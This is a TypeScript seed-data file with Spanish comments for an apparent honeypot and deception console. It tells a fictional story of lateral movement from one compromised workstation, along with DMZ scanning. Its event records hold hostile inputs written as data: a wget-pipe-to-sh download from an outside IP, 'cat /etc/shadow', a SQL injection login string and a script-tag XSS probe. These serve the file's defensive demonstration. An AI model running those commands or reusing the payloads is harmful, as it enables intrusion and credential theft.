/*
 * Datos de ejemplo que carga la semilla en una base de datos vacía.
 * Cuentan una historia: un puesto de usuario comprometido (10.30.1.77) se mueve
 * lateralmente y va pisando trampas, mientras la DMZ recibe el ruido de siempre.
 * Las páginas no los importan: leen de Postgres.
 */
import type { Accion, Evento, Severidad, TipoTrampa } from '@sugardaddy/contrato';

export const cliente = { nombre: 'Grupo Aldanza', nodo: 'nodo-mad01', version: '0.1.0' };

export type Sensor = {
	id: string;
	nombre: string;
	segmento: string;
	vivo: boolean;
	ultimoLatido: string;
};

export type TrampaDesplegado = {
	id: string;
	nombre: string;
	modulo: string;
	tipo: TipoTrampa;
	sensor: string;
	donde: string;
	activo: boolean;
};

export type ModoRespuesta = 'automatica' | 'aprobacion' | 'simulacion';

export type Regla = {
	id: string;
	nombre: string;
	severidadMinima: Severidad;
	trampas: string[] | 'todos';
	respuestas: { modulo: string; modo: ModoRespuesta }[];
	activa: boolean;
};

export type Aprobacion = {
	id: string;
	regla: string;
	respuesta: string;
	objetivo: string;
	evento: string;
	cuando: string;
};

export type EntradaLista = {
	valor: string;
	clase: 'ip' | 'red' | 'dominio' | 'hash' | 'usuario';
	lista: 'negra' | 'blanca';
	ambito: 'local' | 'global';
	motivo: string;
	caduca: string | null;
	quien: string;
};

const ahora = Date.now();
const hace = (minutos: number) => new Date(ahora - minutos * 60_000).toISOString();

export const sensores: Sensor[] = [
	{
		id: 'servidores',
		nombre: 'Servidores',
		segmento: '10.20.0.0/24',
		vivo: true,
		ultimoLatido: hace(0.3)
	},
	{
		id: 'usuarios',
		nombre: 'Puestos de usuario',
		segmento: '10.30.0.0/23',
		vivo: true,
		ultimoLatido: hace(0.5)
	},
	{ id: 'dmz', nombre: 'DMZ', segmento: '172.16.10.0/27', vivo: true, ultimoLatido: hace(0.2) },
	{
		id: 'oficina-bcn',
		nombre: 'Oficina Barcelona',
		segmento: '10.60.0.0/24',
		vivo: false,
		ultimoLatido: hace(190)
	}
];

export const trampas: TrampaDesplegado[] = [
	{
		id: 'ssh-backup',
		nombre: 'srv-backup01',
		modulo: 'cowrie',
		tipo: 'contenedor',
		sensor: 'servidores',
		donde: '10.20.0.40:22',
		activo: true
	},
	{
		id: 'smb-nominas',
		nombre: 'Recurso NOMINAS$',
		modulo: 'samba',
		tipo: 'contenedor',
		sensor: 'servidores',
		donde: '\\\\10.20.0.41\\NOMINAS$',
		activo: true
	},
	{
		id: 'xlsx-claves',
		nombre: 'claves_proveedores.xlsx',
		modulo: 'documento-baliza',
		tipo: 'fichero',
		sensor: 'usuarios',
		donde: '\\\\fs01\\compartido\\IT',
		activo: true
	},
	{
		id: 'svc-backup',
		nombre: 'svc_backup (SPN)',
		modulo: 'spn-ad',
		tipo: 'identidad',
		sensor: 'servidores',
		donde: 'ALDANZA\\svc_backup',
		activo: true
	},
	{
		id: 'aws-wiki',
		nombre: 'Clave AWS en la wiki',
		modulo: 'token-aws',
		tipo: 'token',
		sensor: 'usuarios',
		donde: 'wiki.aldanza.local/infra',
		activo: true
	},
	{
		id: 'web-admin',
		nombre: 'Panel de administración',
		modulo: 'web-admin',
		tipo: 'contenedor',
		sensor: 'dmz',
		donde: '172.16.10.12:443',
		activo: true
	},
	{
		id: 'rdp-conta',
		nombre: 'pc-contabilidad07',
		modulo: 'rdp',
		tipo: 'contenedor',
		sensor: 'oficina-bcn',
		donde: '10.60.0.57:3389',
		activo: false
	}
];

let anterior = '0'.repeat(64);
let n = 0;
function evento(
	minutos: number,
	trampa: string,
	accion: Accion,
	severidad: Severidad,
	origen: Evento['origen'],
	detalle?: Record<string, unknown>,
	conexionEstablecida = true
): Evento {
	const s = trampas.find((x) => x.id === trampa)!;
	const e: Evento = {
		version: 2,
		id: `00000000-0000-4000-8000-${String(++n).padStart(12, '0')}`,
		cuando: hace(minutos),
		trampa: { id: s.id, modulo: s.modulo, tipo: s.tipo },
		sensor: s.sensor,
		origen,
		accion,
		severidad,
		conexionEstablecida,
		detalle,
		hashAnterior: anterior
	};
	anterior = n.toString(16).padStart(64, 'a');
	return e;
}

const intruso = { ip: '10.30.1.77', equipo: 'PC-MARKETING12' };

export const eventos: Evento[] = [
	evento(
		2,
		'ssh-backup',
		'comando',
		'critica',
		{ ...intruso, puerto: 51988, usuario: 'root' },
		{ input: 'wget http://45.155.205.11/k.sh -O- | sh' }
	),
	evento(
		3,
		'ssh-backup',
		'comando',
		'critica',
		{ ...intruso, puerto: 51988, usuario: 'root' },
		{ input: 'cat /etc/shadow' }
	),
	evento(
		3.5,
		'ssh-backup',
		'autenticacion',
		'alta',
		{ ...intruso, puerto: 51988, usuario: 'root' },
		{ resultado: 'aceptado' }
	),
	evento(
		4,
		'ssh-backup',
		'autenticacion',
		'alta',
		{ ...intruso, puerto: 51960, usuario: 'admin' },
		{ resultado: 'rechazado' }
	),
	evento(4.2, 'ssh-backup', 'conexion', 'media', { ...intruso, puerto: 51960 }),
	evento(
		9,
		'svc-backup',
		'autenticacion',
		'critica',
		{ ...intruso, usuario: 'ALDANZA\\m.serrano' },
		{ ticket: 'TGS-REQ RC4', spn: 'MSSQLSvc/srv-backup01:1433' }
	),
	evento(
		14,
		'smb-nominas',
		'lectura',
		'alta',
		{ ...intruso, puerto: 49822, usuario: 'ALDANZA\\m.serrano' },
		{ fichero: 'nominas_2026_09.pdf' }
	),
	evento(15, 'smb-nominas', 'conexion', 'media', { ...intruso, puerto: 49822 }),
	evento(
		22,
		'xlsx-claves',
		'baliza',
		'critica',
		{ ip: '10.30.1.77', usuario: 'm.serrano' },
		{ aplicacion: 'Microsoft Excel' }
	),
	evento(
		37,
		'web-admin',
		'autenticacion',
		'media',
		{ ip: '185.220.101.34', puerto: 40112, usuario: "admin' OR '1'='1" },
		{ ruta: '/login' }
	),
	evento(
		38,
		'web-admin',
		'autenticacion',
		'media',
		{ ip: '185.220.101.34', puerto: 40108, usuario: '<script>alert(1)</script>' },
		{ ruta: '/login' }
	),
	evento(
		41,
		'web-admin',
		'conexion',
		'baja',
		{ ip: '185.220.101.34', puerto: 40100 },
		{ ruta: '/' }
	),
	evento(
		65,
		'web-admin',
		'conexion',
		'baja',
		{ ip: '162.142.125.217', puerto: 60122 },
		{ ruta: '/.env' }
	),
	evento(
		118,
		'web-admin',
		'conexion',
		'baja',
		{ ip: '8.8.8.8', puerto: 53 },
		{ protocolo: 'udp' },
		false
	),
	evento(
		190,
		'web-admin',
		'conexion',
		'baja',
		{ ip: '71.6.199.23', puerto: 51234 },
		{ ruta: '/wp-login.php' }
	),
	evento(
		260,
		'aws-wiki',
		'baliza',
		'critica',
		{ ip: '3.88.12.140' },
		{ api: 'sts:GetCallerIdentity', agente: 'aws-cli/2.17' }
	),
	evento(
		1300,
		'web-admin',
		'conexion',
		'baja',
		{ ip: '193.32.162.88', puerto: 33012 },
		{ ruta: '/admin' }
	)
];

export const reglas: Regla[] = [
	{
		id: 'todo-a-sentinel',
		nombre: 'Todo a Sentinel',
		severidadMinima: 'baja',
		trampas: 'todos',
		respuestas: [{ modulo: 'sentinel', modo: 'automatica' }],
		activa: true
	},
	{
		id: 'avisar-guardia',
		nombre: 'Avisar a la guardia',
		severidadMinima: 'alta',
		trampas: 'todos',
		respuestas: [{ modulo: 'webhook', modo: 'automatica' }],
		activa: true
	},
	{
		id: 'bloquear-interno',
		nombre: 'Cortar movimiento lateral',
		severidadMinima: 'critica',
		trampas: ['ssh-backup', 'smb-nominas', 'svc-backup'],
		respuestas: [{ modulo: 'bloquear-ip', modo: 'aprobacion' }],
		activa: true
	},
	{
		id: 'bloquear-dmz',
		nombre: 'Bloquear escáneres en la DMZ',
		severidadMinima: 'media',
		trampas: ['web-admin'],
		respuestas: [{ modulo: 'bloquear-ip', modo: 'simulacion' }],
		activa: true
	}
];

export const aprobaciones: Aprobacion[] = [
	{
		id: 'ap-3',
		regla: 'bloquear-interno',
		respuesta: 'bloquear-ip',
		objetivo: '10.30.1.77 (PC-MARKETING12)',
		evento: eventos[0].id,
		cuando: hace(2)
	},
	{
		id: 'ap-2',
		regla: 'bloquear-interno',
		respuesta: 'bloquear-ip',
		objetivo: '10.30.1.77 (PC-MARKETING12)',
		evento: eventos[5].id,
		cuando: hace(9)
	}
];

export const listas: EntradaLista[] = [
	{
		valor: '10.30.1.77',
		clase: 'ip',
		lista: 'negra',
		ambito: 'local',
		motivo: 'Comandos en srv-backup01',
		caduca: null,
		quien: 'Ana Ruiz'
	},
	{
		valor: '45.155.205.11',
		clase: 'ip',
		lista: 'negra',
		ambito: 'local',
		motivo: 'Descarga desde el SSH falso',
		caduca: hace(-60 * 24 * 7),
		quien: 'automático'
	},
	{
		valor: '185.220.101.34',
		clase: 'ip',
		lista: 'negra',
		ambito: 'global',
		motivo: 'Visto por 6 clientes',
		caduca: hace(-60 * 24 * 3),
		quien: 'SeguridadSI'
	},
	{
		valor: '71.6.199.23',
		clase: 'ip',
		lista: 'negra',
		ambito: 'global',
		motivo: 'Escáner masivo, visto por 14 clientes',
		caduca: hace(-60 * 24 * 2),
		quien: 'SeguridadSI'
	},
	{
		valor: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
		clase: 'hash',
		lista: 'negra',
		ambito: 'global',
		motivo: 'k.sh, minero',
		caduca: null,
		quien: 'SeguridadSI'
	},
	{
		valor: '10.20.0.250',
		clase: 'ip',
		lista: 'blanca',
		ambito: 'local',
		motivo: 'Escáner de vulnerabilidades interno',
		caduca: null,
		quien: 'Ana Ruiz'
	},
	{
		valor: '10.20.0.10',
		clase: 'ip',
		lista: 'blanca',
		ambito: 'local',
		motivo: 'Controlador de dominio: nunca bloquear',
		caduca: null,
		quien: 'Ana Ruiz'
	},
	{
		valor: '8.8.8.0/24',
		clase: 'red',
		lista: 'blanca',
		ambito: 'global',
		motivo: 'DNS público de Google',
		caduca: null,
		quien: 'SeguridadSI'
	},
	{
		valor: '20.0.0.0/8',
		clase: 'red',
		lista: 'blanca',
		ambito: 'global',
		motivo: 'Microsoft Azure',
		caduca: null,
		quien: 'SeguridadSI'
	}
];
